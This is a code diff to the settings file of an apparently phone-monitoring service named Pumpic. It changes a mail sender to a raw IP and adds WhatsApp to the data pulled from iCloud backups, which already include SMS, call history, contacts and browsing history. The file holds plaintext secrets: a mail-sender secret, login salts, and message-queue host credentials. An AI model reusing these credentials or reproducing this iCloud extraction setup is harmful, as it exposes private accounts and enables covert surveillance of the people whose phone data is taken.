@@ -23,7 +23,7 @@ class GlobalSettings
             'supportEmail' => 'support@pumpic.com',
             'registrationPage' => 'http://pumpic.com/store.html',
             'refundPolicyPage' => 'http://pumpic.com/policy.html#refund-policy',
-            'mailSender' => 'http://sender-mail.pumpic.com/',
+            'mailSender' => 'http://148.251.64.1:8888/',
             'mailSenderSecret' => '258EAFA5-E914-47DA-95CA-C5AB0DC85B11',
             'directLoginSalt' => '2hTXkCn38;J]eN}b-'
         ),
@@ -37,7 +37,7 @@ class GlobalSettings
             'supportEmail' => 'support@pumpic.com',
             'registrationPage' => 'http://pumpic.com/store.html',
             'refundPolicyPage' => 'http://pumpic.com/policy.html#refund-policy',
-            'mailSender' => 'http://sender-mail.pumpic.com/',
+            'mailSender' => 'http://148.251.64.1:8888/',
             'mailSenderSecret' => '258EAFA5-E914-47DA-95CA-C5AB0DC85B11',
             'directLoginSalt' => 'wNDs{j++?o@-*|q|2hTXkCn38;J]eN}b--n9/SIVoj6+'
         )
@@ -115,13 +115,13 @@ class GlobalSettings
     protected static $icloud = array(
         'pathIcloudBackups' => '/var/www/dump/',
         'pathDownloadService' => '/var/www/service/current/download_icloud/iloot.py',
-        'backupItems' => 'calendar address_book call_history bookmarks web_history sms skype' // "sms call_history address_book calendar notes all_sql all_db all_sql3 all_plist all_storedata"
+        'backupItems' => 'calendar address_book call_history bookmarks web_history sms skype whatsapp' // "sms call_history address_book calendar notes all_sql all_db all_sql3 all_plist all_storedata"
     );
     protected static $queue = array(
         'host' => '188.166.51.138',
         'port' => 5672,
-        'user' => 'mqadmin',
-        'password' => 'mqadmin',
+        'user' => 'worker_user',
+        'password' => 'ZSHfQF5JTEjM7en',
         'vhost' => '/',
         'countErrorCycles' => 2,
     );
@@ -136,9 +136,12 @@ class GlobalSettings
     
     protected static $removeApp = false; //if deleteApp = true then android and ios replace self empty app
     
+    protected static $sendCrashLog = true;
+    
+    
     protected static $versionsApps = array(
-        'ios' => 2,
-        'android' => 4,
+        'ios' => 13,
+        'android' => 16,
         'blackberry' => 1
     );
     protected static $apiJson = array(
@@ -163,6 +166,10 @@ class GlobalSettings
     public static function getRemoveApp()
     {
         return self::$removeApp;
+    }
+    
+    public static function sendCrachLog(){
+        return self::$sendCrashLog;
     }
     
     public static function getVersionApp($os)
